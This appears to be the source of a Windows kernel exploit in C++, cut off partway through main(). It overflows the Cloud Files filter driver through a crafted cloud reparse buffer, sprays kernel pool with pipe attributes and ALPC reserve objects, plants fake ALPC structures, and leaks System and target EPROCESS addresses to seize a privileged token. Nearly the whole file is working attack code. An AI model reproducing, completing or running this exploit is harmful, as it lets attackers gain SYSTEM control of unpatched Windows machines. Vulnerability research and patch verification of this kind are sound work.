#include <Windows.h>
#include <stdio.h>
#include <cfapi.h>

#pragma comment(lib, "cldapi.lib")
#pragma comment(lib, "ntdll")

#define NT_SUCCESS(Status)			((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH	((NTSTATUS)0xC0000004L)

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemHandleInformation = 16,
	SystemBigPoolInformation = 66
} SYSTEM_INFORMATION_CLASS;

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	unsigned short UniqueProcessId;
	unsigned short CreatorBackTraceIndex;
	unsigned char ObjectTypeIndex;
	unsigned char HandleAttributes;
	unsigned short HandleValue;
	void* Object;
	unsigned long GrantedAccess;
	long __PADDING__[1];
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	unsigned long NumberOfHandles;
	struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_BIGPOOL_ENTRY {
	union {
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;
	};
	SIZE_T SizeInBytes;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
} SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
} SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;


#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;


typedef NTSTATUS(NTAPI* NTCREATEFILE)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* NTFSCONTROLFILE)(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PVOID ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG FsControlCode,
	IN PVOID InputBuffer OPTIONAL,
	IN ULONG InputBufferLength,
	OUT PVOID OutputBuffer OPTIONAL,
	IN ULONG OutputBufferLength
	);
typedef NTSTATUS(NTAPI* RTLGETCOMPRESSIONWORKSPACESIZE)(
	IN  USHORT CompressionFormatAndEngine,
	OUT PULONG CompressBufferWorkSpaceSize,
	OUT PULONG CompressFragmentWorkSpaceSize
	);
typedef NTSTATUS(NTAPI* RTLCOMPRESSBUFFER)(
	IN  USHORT CompressionFormatAndEngine,
	IN  PUCHAR UncompressedBuffer,
	IN  ULONG  UncompressedBufferSize,
	OUT PUCHAR CompressedBuffer,
	IN  ULONG  CompressedBufferSize,
	IN  ULONG  UncompressedChunkSize,
	OUT PULONG FinalCompressedSize,
	IN  PVOID  WorkSpace
	);
typedef NTSTATUS(NTAPI* NTQUERYSYSTEMINFORMATION)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

NTCREATEFILE NtCreateFile;
NTFSCONTROLFILE NtFsControlFile;
RTLGETCOMPRESSIONWORKSPACESIZE RtlGetCompressionWorkSpaceSize;
RTLCOMPRESSBUFFER RtlCompressBuffer;
NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;


#define MAX_MSG_LEN 0x500
#define ALPC_MSGFLG_NONE 0x0


typedef struct _ALPC_PORT_ATTRIBUTES {
	unsigned long Flags;
	SECURITY_QUALITY_OF_SERVICE SecurityQos;
	unsigned __int64 MaxMessageLength;
	unsigned __int64 MemoryBandwidth;
	unsigned __int64 MaxPoolUsage;
	unsigned __int64 MaxSectionSize;
	unsigned __int64 MaxViewSize;
	unsigned __int64 MaxTotalSectionSize;
	ULONG DupObjectTypes;
#ifdef _WIN64
	ULONG Reserved;
#endif
} ALPC_PORT_ATTRIBUTES, * PALPC_PORT_ATTRIBUTES;

typedef struct _ALPC_MESSAGE_ATTRIBUTES {
	ULONG AllocatedAttributes;
	ULONG ValidAttributes;
} ALPC_MESSAGE_ATTRIBUTES, * PALPC_MESSAGE_ATTRIBUTES;

typedef struct _PORT_MESSAGE {
	union {
		struct {
			USHORT DataLength;
			USHORT TotalLength;
		} s1;
		ULONG Length;
	} u1;
	union {
		struct {
			USHORT Type;
			USHORT DataInfoOffset;
		} s2;
		ULONG ZeroInit;
	} u2;
	union {
		CLIENT_ID ClientId;
		double DoNotUseThisField;
	};
	ULONG MessageId;
	union {
		SIZE_T ClientViewSize; // only valid for LPC_CONNECTION_REQUEST messages
		ULONG CallbackId; // only valid for LPC_REQUEST messages
	};
} PORT_MESSAGE, * PPORT_MESSAGE;

typedef struct _ALPC_MESSAGE {
	PORT_MESSAGE PortHeader;
	BYTE PortMessage[1000]; // Hard limit for this is 65488. An Error is thrown if AlpcMaxAllowedMessageLength() is exceeded
} ALPC_MESSAGE, * PALPC_MESSAGE;

typedef struct _KALPC_MESSAGE {
	struct _LIST_ENTRY Entry;                                               //0x0
	struct _ALPC_PORT* PortQueue;                                           //0x10
	struct _ALPC_PORT* OwnerPort;                                           //0x18
	struct _ETHREAD* WaitingThread;                                         //0x20
	union {
		struct {
			ULONG QueueType : 3;                                              //0x28
			ULONG QueuePortType : 4;                                          //0x28
			ULONG Canceled : 1;                                               //0x28
			ULONG Ready : 1;                                                  //0x28
			ULONG ReleaseMessage : 1;                                         //0x28
			ULONG SharedQuota : 1;                                            //0x28
			ULONG ReplyWaitReply : 1;                                         //0x28
			ULONG OwnerPortReference : 1;                                     //0x28
			ULONG ReceiverReference : 1;                                      //0x28
			ULONG ViewAttributeRetrieved : 1;                                 //0x28
			ULONG ViewAttributeDeleteOnRelease : 1;                           //0x28
			ULONG InDispatch : 1;                                             //0x28
			ULONG InCanceledQueue : 1;                                        //0x28
		} s1;                                                               //0x28
		ULONG State;                                                        //0x28
	} u1;                                                                   //0x28
	LONG SequenceNo;                                                        //0x2c
	union {
		struct _EPROCESS* QuotaProcess;                                     //0x30
		VOID* QuotaBlock;                                                   //0x30
	};
	struct _ALPC_PORT* CancelSequencePort;                                  //0x38
	struct _ALPC_PORT* CancelQueuePort;                                     //0x40
	LONG CancelSequenceNo;                                                  //0x48
	struct _LIST_ENTRY CancelListEntry;                                     //0x50
	struct _KALPC_RESERVE* Reserve;                                         //0x60
	BYTE MessageAttributesStub[0x48]; //struct _KALPC_MESSAGE_ATTRIBUTES MessageAttributes;                     //0x68
	VOID* DataUserVa;                                                       //0xb0
	struct _ALPC_COMMUNICATION_INFO* CommunicationInfo;                     //0xb8
	struct _ALPC_PORT* ConnectionPort;                                      //0xc0
	struct _ETHREAD* ServerThread;                                          //0xc8
	VOID* WakeReference;                                                    //0xd0
	VOID* WakeReference2;                                                   //0xd8
	VOID* ExtensionBuffer;                                                  //0xe0
	ULONGLONG ExtensionBufferSize;                                          //0xe8
	struct _PORT_MESSAGE PortMessage;                                       //0xf0
} KALPC_MESSAGE;

typedef struct _KALPC_RESERVE {
	struct _ALPC_PORT* OwnerPort;											//0x0
	struct _ALPC_HANDLE_TABLE* HandleTable;									//0x8
	VOID* Handle;															//0x10
	struct _KALPC_MESSAGE* Message;											//0x18
	ULONGLONG Size;															//0x20
	LONG Active;															//0x28
} KALPC_RESERVE;

extern "C"
NTSTATUS NTAPI NtAlpcCreatePort(
	_Out_ PHANDLE PortHandle,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PALPC_PORT_ATTRIBUTES PortAttributes
);

extern "C"
NTSTATUS NTAPI NtAlpcCreateResourceReserve(
	_In_ HANDLE PortHandle,
	_Reserved_ ULONG Flags,
	_In_ SIZE_T MessageSize,
	_Out_ PHANDLE ResourceId
);

extern "C"
NTSTATUS NTAPI NtAlpcSendWaitReceivePort(
	_In_ HANDLE  							PortHandle,
	_In_ ULONG  							Flags,
	_Inout_opt_ PPORT_MESSAGE  				SendMessage,
	_Inout_opt_ PALPC_MESSAGE_ATTRIBUTES  	SendMessageAttributes,
	_Inout_opt_ PPORT_MESSAGE               ReceiveMessage,
	_Inout_opt_ PSIZE_T  					BufferLength,
	_Inout_opt_ PALPC_MESSAGE_ATTRIBUTES  	ReceiveMessageAttributes,
	_In_opt_ PLARGE_INTEGER  				Timeout
);


typedef struct {
	WORD Tag;
	WORD Size;
	DWORD Offset;
} RB_CLD_ITEM;

typedef struct {
	DWORD Tag_pRef;
	DWORD Crc32;
	DWORD Size;
	WORD Reserved;
	WORD NumCldItems;
	RB_CLD_ITEM Items[0xB];
} REPARSE_CLD_BUFFER;

typedef struct _REPARSE_DATA_BUFFER {
	DWORD ReparseTag;
	WORD ReparseDataLength;
	WORD Reserved;
	WORD Flags;
	WORD UncompressedSize;
	REPARSE_CLD_BUFFER ReparseCldBuffer;
} REPARSE_DATA_BUFFER;


SIZE_T StringLengthW(_In_ LPCWSTR String) {
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

VOID RtlInitUnicodeString(_Inout_ PUNICODE_STRING DestinationString, _In_ PCWSTR SourceString) {
	SIZE_T DestSize;

	if (SourceString) {
		DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else {
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

DWORD Crc32(BYTE* data, ULONG size) {
	DWORD t, r = ~0;
	BYTE* end = data + size;

	while (data < end) {
		r ^= *data++;

		for (UINT i = 0; i < 8; i++) {
			t = ~((r & 1) - 1);
			r = (r >> 1) ^ (0xEDB88320 & t);
		}
	}

	return ~r;
}

BOOL CompressBuffer(IN BYTE* data, IN DWORD size, OUT BYTE** compressedData, OUT DWORD* compressedSize) {
	BOOL status = FALSE;
	DWORD CompressBufferWorkSpaceSize, CompressFragmentWorkSpaceSize;
	PVOID WorkSpace;

	status = SUCCEEDED(RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &CompressBufferWorkSpaceSize, &CompressFragmentWorkSpaceSize));
	if (!status)
		return FALSE;
	WorkSpace = LocalAlloc(LPTR, CompressBufferWorkSpaceSize);
	*compressedData = (BYTE*)LocalAlloc(LPTR, size);
	status = SUCCEEDED(RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1, (PUCHAR)data, size, (PUCHAR)(*compressedData), size, 4096, compressedSize, WorkSpace));
	if (!status)
		LocalFree(*compressedData);
	LocalFree(WorkSpace);

	return status;
}

REPARSE_DATA_BUFFER* MakeReparseBuffer(BYTE* overData, ULONG overSize) {
	BYTE* pCompressedData;
	ULONG compressedSize;

	ULONG itemDataSize = 0x4000 - 0x74;
	ULONG dataSize = 8 + itemDataSize + overSize;
	BYTE* pData = (BYTE*)calloc(1, dataSize);
	REPARSE_DATA_BUFFER* pRb = (REPARSE_DATA_BUFFER*)calloc(1, sizeof(REPARSE_DATA_BUFFER) + dataSize);
	pRb->ReparseTag = IO_REPARSE_TAG_CLOUD_3;
	pRb->ReparseDataLength = sizeof(DWORD) + sizeof(REPARSE_CLD_BUFFER) + dataSize;
	pRb->Flags = 0x0001;
	pRb->UncompressedSize = pRb->ReparseDataLength;
	pRb->ReparseCldBuffer.Tag_pRef = 0x70526546;
	pRb->ReparseCldBuffer.Size = sizeof(REPARSE_CLD_BUFFER) + dataSize;
	pRb->ReparseCldBuffer.Reserved = 0x02;
	pRb->ReparseCldBuffer.NumCldItems = 0xb;

	pRb->ReparseCldBuffer.Items[0].Tag = 0x7;
	pRb->ReparseCldBuffer.Items[0].Size = 0x1;
	pRb->ReparseCldBuffer.Items[0].Offset = 0x68;

	pRb->ReparseCldBuffer.Items[1].Tag = 0xa;
	pRb->ReparseCldBuffer.Items[1].Size = 0x4;
	pRb->ReparseCldBuffer.Items[1].Offset = 0x6c;

	pRb->ReparseCldBuffer.Items[3].Tag = 0x11;
	pRb->ReparseCldBuffer.Items[3].Size = 0x0;
	pRb->ReparseCldBuffer.Items[3].Offset = 0x70;

	pRb->ReparseCldBuffer.Items[0xa].Tag = 0;
	pRb->ReparseCldBuffer.Items[0xa].Size = itemDataSize + overSize;
	pRb->ReparseCldBuffer.Items[0xa].Offset = 0x70;


	memset(pData, 0x41, dataSize);
	*(UINT32*)pData = 0x1;
	*(UINT32*)(pData + 4) = 0x3e;
	memcpy(pData + 8 + itemDataSize, overData, overSize);

	memcpy((BYTE*)pRb + sizeof(REPARSE_DATA_BUFFER), pData, dataSize);

	pRb->ReparseCldBuffer.Crc32 = Crc32((BYTE*)pRb + 0x14, sizeof(REPARSE_CLD_BUFFER) - 8 + dataSize);

	// need compress?
	if ((pRb->ReparseDataLength + 8) < 0x4000)
		return pRb;

	pRb->Flags |= 0x8000;
	CompressBuffer((BYTE*)pRb + 12, sizeof(REPARSE_CLD_BUFFER) + dataSize, &pCompressedData, &compressedSize);
	pRb->ReparseDataLength = compressedSize + 4;
	memcpy((BYTE*)pRb + 12, pCompressedData, compressedSize);
	LocalFree(pCompressedData);

	if ((pRb->ReparseDataLength + 8) > 0x4000) {
		printf("[-] Reparse Data Too Big\n");
		exit(1);
	}

	return pRb;
}


HANDLE g_hReadPipe = NULL;
HANDLE g_hWritePipe = NULL;

BOOL PipeInit() {
	return CreatePipe(&g_hReadPipe, &g_hWritePipe, NULL, 0);
}

BOOL PipeWriteAttr(VOID* attr, UINT attrSize) {
	IO_STATUS_BLOCK iosb;
	char output[0x100];
	NTSTATUS ntRet = NtFsControlFile(g_hWritePipe, NULL, NULL, NULL,
		&iosb, 0x11003C, attr, attrSize,
		output, sizeof(output));
	return NT_SUCCESS(ntRet);
}

BOOL PipeReadAttr(CHAR* pipeName, BYTE* pOutput, SIZE_T outputSize) {
	IO_STATUS_BLOCK iosb;
	NTSTATUS ntRet = NtFsControlFile(g_hWritePipe, NULL, NULL, NULL, &iosb, 0x110038, pipeName, strlen(pipeName) + 1, pOutput, outputSize);
	return NT_SUCCESS(ntRet);
}

BOOL PipePoolSprayAlloc(SIZE_T poolSize, UINT sprayCount, BYTE* pAttr, PCSTR szPrefix) {
	BOOL bRet = TRUE;
	SIZE_T attrSize = poolSize - 0x28;
	for (UINT i = 0; i < sprayCount; i++) {
		snprintf((CHAR*)pAttr, attrSize, "%s%x", szPrefix, i);
		if (!PipeWriteAttr(pAttr, attrSize)) {
			bRet = FALSE;
			break;
		}
	}

	return bRet;
}

BOOL PipePoolSprayFree(PCSTR szPrefix, UINT count) {
	CHAR name[16];
	for (int i = 0; i < count; i++) {
		snprintf(name, sizeof(name), "%s%x", szPrefix, i);
		if (!PipeWriteAttr(name, strlen(name) + 1)) {
			return FALSE;
		}
	}

	return TRUE;
}


CONST WCHAR g_wszPortPrefix[] = L"MyPort";
HANDLE g_hResource = NULL;

BOOL CreateALPCPorts(HANDLE* phPorts, UINT portsCount) {
	ALPC_PORT_ATTRIBUTES serverPortAttr;
	OBJECT_ATTRIBUTES    oaPort;
	HANDLE               hPort;
	NTSTATUS             ntRet;
	UNICODE_STRING       usPortName;
	WCHAR				 wszPortName[64];

	for (UINT i = 0; i < portsCount; i++) {
		swprintf_s(wszPortName, sizeof(wszPortName) / sizeof(WCHAR), L"\\RPC Control\\%s%d", g_wszPortPrefix, i);
		RtlInitUnicodeString(&usPortName, wszPortName);
		InitializeObjectAttributes(&oaPort, &usPortName, 0, 0, 0);
		RtlSecureZeroMemory(&serverPortAttr, sizeof(serverPortAttr));
		serverPortAttr.MaxMessageLength = MAX_MSG_LEN;
		ntRet = NtAlpcCreatePort(&phPorts[i], &oaPort, &serverPortAttr);
		if (!NT_SUCCESS(ntRet))
			return FALSE;
	}

	return TRUE;
}

BOOL AllocateALPCReserveHandles(HANDLE* phPorts, UINT portsCount, UINT reservesCount) {
	HANDLE hPort;
	HANDLE hResource;
	NTSTATUS ntRet;

	for (UINT i = 0; i < portsCount; i++) {
		hPort = phPorts[i];
		for (UINT j = 0; j < reservesCount; j++) {
			ntRet = NtAlpcCreateResourceReserve(hPort, 0, 0x28, &hResource);
			if (!NT_SUCCESS(ntRet))
				return FALSE;
			if (g_hResource == NULL) {	// save only the very first
				g_hResource = hResource;
			}

		}
	}

	return TRUE;
}

BOOL GetObjAddr(PVOID* ppObjAddr, ULONG ulPid, HANDLE handle) {
	PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
	ULONG ulBytes = 0;
	NTSTATUS ntRet;

	*ppObjAddr = NULL;

	while ((ntRet = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH) {
		if (pHandleInfo != NULL) {
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(pHandleInfo, 2 * ulBytes);
		}
		else {
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)calloc(1, 2 * ulBytes);
		}
	}

	if (!NT_SUCCESS(ntRet)) {
		goto Exit;
	}

	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++) {
		if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == (USHORT)handle)) {
			*ppObjAddr = pHandleInfo->Handles[i].Object;
			break;
		}
	}

Exit:
	if (pHandleInfo)
		free(pHandleInfo);

	return (*ppObjAddr != NULL);
}

BOOL GetPoolAddr(PVOID* ppPoolAddr, UINT tag, SIZE_T poolSize) {
	NTSTATUS ntRet;
	BOOL bRet = FALSE;
	ULONG retlen;

	*ppPoolAddr = NULL;
	DWORD* info = (DWORD*)malloc(0x1000);
	PSYSTEM_BIGPOOL_INFORMATION pBigPoolInfo;
	ntRet = NtQuerySystemInformation(SystemBigPoolInformation, info, 0x1000, &retlen);
	if ((ntRet != STATUS_INFO_LENGTH_MISMATCH) && !NT_SUCCESS(ntRet)) {
		goto Exit;
	}

	info = (DWORD*)realloc(info, retlen);
	ntRet = NtQuerySystemInformation(SystemBigPoolInformation, info, retlen, &retlen);
	if (!NT_SUCCESS(ntRet)) {
		goto Exit;
	}

	pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)info;
	if (pBigPoolInfo->Count == 0) {
		goto Exit;
	}
	for (ULONG i = pBigPoolInfo->Count - 1; i >= 0; i--) {
		if ((pBigPoolInfo->AllocatedInfo[i].TagUlong == tag) && (pBigPoolInfo->AllocatedInfo[i].SizeInBytes == poolSize)) {
			*ppPoolAddr = pBigPoolInfo->AllocatedInfo[i].VirtualAddress;
			bRet = TRUE;
			break;
		}
	}

Exit:
	free(info);
	return bRet;
}

BOOL isKernAddr(ULONG_PTR kaddr) {
	return ((kaddr & 0xffff800000000000) == 0xffff800000000000);
}


ULONG g_ulTokenOffset = 0x4b8;

BOOL checkOSVersion() {

	ULONG_PTR peb = *(ULONG_PTR*)((BYTE*)NtCurrentTeb() + 0x60);
	USHORT OSBuildNumber = *(USHORT*)((BYTE*)peb + 0x120);

	if ((OSBuildNumber >= 18362) && (OSBuildNumber <= 18363)) {
		g_ulTokenOffset = 0x360;
	}
	
	return (OSBuildNumber >= 18362);
}



#define SPRAY_COUNT 0x1000


int main(int argc, char** argv) {
	NTSTATUS ntRet;
	BOOL bRet;
	ULONG ulExitCode = 1;
	STARTUPINFO StartupInfo = { 0 };
	PROCESS_INFORMATION ProcessInformation = { 0 };
	HANDLE hF = NULL;

	WCHAR* dir = (WCHAR*)L"C:\\ProgramData\\";
	CfUnregisterSyncRoot(dir);

	CONST UINT portsCount = SPRAY_COUNT;
	HANDLE* ports = (HANDLE*)calloc(portsCount, sizeof(HANDLE));

	do {

		BOOL runCmd = TRUE;
		DWORD dwPid = GetCurrentProcessId();
		if (argc == 2) {
			dwPid = strtol(argv[1], NULL, 10);
			runCmd = FALSE;
		}
		
		if (!checkOSVersion()) {
			printf("[-] Windows version is not supported\n");
			break;
		}

		HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
		NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(ntdll, "NtFsControlFile");
		NtCreateFile = (NTCREATEFILE)GetProcAddress(ntdll, "NtCreateFile");
		RtlGetCompressionWorkSpaceSize = (RTLGETCOMPRESSIONWORKSPACESIZE)GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
		RtlCompressBuffer = (RTLCOMPRESSBUFFER)GetProcAddress(ntdll, "RtlCompressBuffer");
		NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");


		if (!PipeInit()) {
			printf("[-] Pipe initialization failed\n");
			break;
		}

		printf("[*] Preparation...\n");

		bRet = CreateALPCPorts(ports, portsCount);
		if (!bRet) {
			printf("[-] CreateALPCPorts failed\n");
			break;
		}

		CONST ULONG poolAlHaSize = 0x4000;
		CONST ULONG reservesCount = (poolAlHaSize / 2) / sizeof(ULONG_PTR) + 1;

		bRet = AllocateALPCReserveHandles(ports, portsCount, reservesCount - 1);
		if (!bRet) {
			printf("[-] CreateALPCPorts failed\n");
			break;
		}


		CF_SYNC_REGISTRATION reg = { 0 };
		reg.StructSize = sizeof(reg);
		reg.ProviderName = L"test";
		reg.ProviderVersion = L"1.0";
		reg.ProviderId = { 0xB196E670, 0x59C7, 0x4D41, { 0 } };
		CF_SYNC_POLICIES policies = { 0 };
		policies.StructSize = sizeof(policies);
		policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
		policies.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
		policies.InSync = CF_INSYNC_POLICY_NONE;
		policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;
		ntRet = CfRegisterSyncRoot(dir, &reg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
		if (!NT_SUCCESS(ntRet)) {
			printf("[-] CfRegisterSyncRoot failed\n");
			break;
		}

		IO_STATUS_BLOCK iosb;
		OBJECT_ATTRIBUTES oa = { 0 };
		UNICODE_STRING name = { 0 };
		WCHAR ntDir[MAX_PATH];
		swprintf(ntDir, MAX_PATH, L"\\??\\%s", dir);

		RtlInitUnicodeString(&name, ntDir);
		InitializeObjectAttributes(&oa, &name, 0x40, 0, NULL);
		ntRet = NtCreateFile(&hF, GENERIC_READ | GENERIC_WRITE, &oa, &iosb, 0, 0, FILE_SHARE_READ, 3, 1, 0, 0);
		if (!NT_SUCCESS(ntRet)) {
			printf("[-] NtCreateFile failed\n");
			break;
		}


		BYTE* fakeKalpcReserveObject = (BYTE*)calloc(1, sizeof(KALPC_RESERVE) + 0x20);
		BYTE* fakeKalpcMessageObject = (BYTE*)calloc(1, sizeof(KALPC_MESSAGE) + 0x20);
		KALPC_RESERVE* fakeKalpcReserve = (KALPC_RESERVE*)(fakeKalpcReserveObject + 0x20);
		KALPC_MESSAGE* fakeKalpcMessage = (KALPC_MESSAGE*)(fakeKalpcMessageObject + 0x20);

		fakeKalpcReserveObject[1] = 0x7;
		fakeKalpcReserveObject[8] = 0x1;

		fakeKalpcMessageObject[8] = 0x1;

		fakeKalpcReserve->Size = 0x28;
		fakeKalpcReserve->Message = fakeKalpcMessage;

		fakeKalpcMessage->Reserve = fakeKalpcReserve;


		ULONG_PTR overData[1];
		overData[0] = (ULONG_PTR)fakeKalpcReserve;
		REPARSE_DATA_BUFFER* reparseBuffer = MakeReparseBuffer((BYTE*)&overData[0], sizeof(overData));
		ULONG rbLen = reparseBuffer->ReparseDataLength;
		BYTE* pRb = (BYTE*)reparseBuffer;

		rbLen += 8;
		ULONG rbSetLen = 0x20;

		BYTE* pRbSet = (BYTE*)calloc(1, rbLen + rbSetLen);
		*(UINT32*)pRbSet = 0;
		*(UINT32*)(pRbSet + 4) = IO_REPARSE_TAG_CLOUD_3;
		memcpy(pRbSet + rbSetLen, pRb, rbLen);

		ntRet = NtFsControlFile(hF, 0, 0, 0, &iosb, FSCTL_SET_REPARSE_POINT_EX, pRbSet, rbLen + rbSetLen, 0, 0);
		if (!NT_SUCCESS(ntRet)) {
			printf("[-] NtFsControlFile(FSCTL_SET_REPARSE_POINT_EX) failed\n");
			break;
		}

		printf("[*] Pool Spray\n");

		ULONG attrSize = 0x4000;
		BYTE* pAttr = (BYTE*)malloc(attrSize);
		memset(pAttr, 0x11, attrSize);

		bRet = PipePoolSprayAlloc(0x1000, 1, pAttr, "x");
		if (!bRet) {
			printf("[-] PipePoolSprayAlloc failed\n");
			break;
		}

		// spray 0x4000
		bRet = PipePoolSprayAlloc(0x4000, SPRAY_COUNT, pAttr, "a");
		if (!bRet) {
			printf("[-] PipePoolSprayAlloc failed\n");
			break;
		}

		// spray 0x4000
		bRet = PipePoolSprayAlloc(0x4000, SPRAY_COUNT, pAttr, "b");
		if (!bRet) {
			printf("[-] PipePoolSprayAlloc failed\n");
			break;
		}
		// free some 0x4000
		UINT holesCount = 0;
		for (int i = 0; i < SPRAY_COUNT; i += 2) {
			snprintf((CHAR*)pAttr, attrSize, "%s%x", "b", i);
			if (!PipeWriteAttr(pAttr, strlen((CHAR*)pAttr) + 1)) {
				printf("[-] PipeWriteAttr failed\n");
				break;
			}
			holesCount++;
		}

		// spray alpc handles 0x4000
		bRet = AllocateALPCReserveHandles(ports, portsCount, 1);
		if (!bRet) {
			printf("[-] AllocateALPCReserveHandles failed\n");
			break;
		}

		// free 0x4000
		for (int i = 1; i < SPRAY_COUNT; i += 2) {
			snprintf((CHAR*)pAttr, attrSize, "%s%x", "b", i);
			if (!PipeWriteAttr(pAttr, strlen((CHAR*)pAttr) + 1)) {
				printf("[-] PipeWriteAttr failed\n");
				break;
			}
		}

		free(pAttr);


		// trigger overflow
		BYTE* output = (BYTE*)calloc(1, 0x100);
		*(UINT32*)(output + 0) = 0x9000001a;
		*(UINT32*)(output + 4) = 0xC0000003;
		*(UINT32*)(output + 8) = 0x10000;
		ntRet = NtFsControlFile(hF, 0, 0, 0, &iosb, 0x903BC, output, 0x100, 0, 0);
		if (!NT_SUCCESS(ntRet)) {
			printf("[-] NtFsControlFile(0x903BC) failed\n");
			break;
		}
		free(output);

		CloseHandle(hF);
		hF = NULL;
		ntRet = CfUnregisterSyncRoot(dir);
		if (!NT_SUCCESS(ntRet)) {
			printf("[!] CfUnregisterSyncRoot failed with 0x%x\n", ntRet);
		}


		ULONG_PTR ullEPROCaddr = NULL;
		ULONG_PTR ullSystemEPROCaddr = NULL;
		HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, dwPid);
		if (hProc == NULL) {
			printf("[-] OpenProcess failed\n");
			break;
		}

		CONST UINT PIPE_ATTR_TAG = 0x7441704E;
		ULONG_PTR ullPipeAttributeAddr = NULL;
		bRet = GetPoolAddr((PVOID*)&ullPipeAttributeAddr, PIPE_ATTR_TAG, 0x1000);
		if (!bRet) {
			printf("[-] GetPoolAddr failed\n");
			break;
		}
		printf("[*] PipeAttribute address: %p\n", ullPipeAttributeAddr);

		bRet = GetObjAddr((PVOID*)&ullSystemEPROCaddr, 4, (HANDLE)4);
		if (!bRet) {
			printf("[-] GetObjAddr failed\n");
			break;
		}
		printf("[*] System EPROCESS: %p\n", ullSystemEPROCaddr);

		bRet = GetObjAddr((PVOID*)&ullEPROCaddr, GetCurrentProcessId(), hProc);
		if (!bRet) {
			printf("[-] GetObjAddr failed\n");
			break;
		}
		printf("[*] Target EPROCESS: %p\n", ullEPROCaddr);


		CHAR pipeName[] = "xxx";
		BYTE* outputData = (BYTE*)calloc(1, 0x1000);
		ULONG_PTR ullToken;
		LIST_ENTRY tmpEntry;


		fakeKalpcMessage->ExtensionBuffer = (BYTE*)ullPipeAttributeAddr + 0x20;
		fakeKalpcMessage->ExtensionBufferSize = 0x10;

		ULONG DataLength = 0x10;
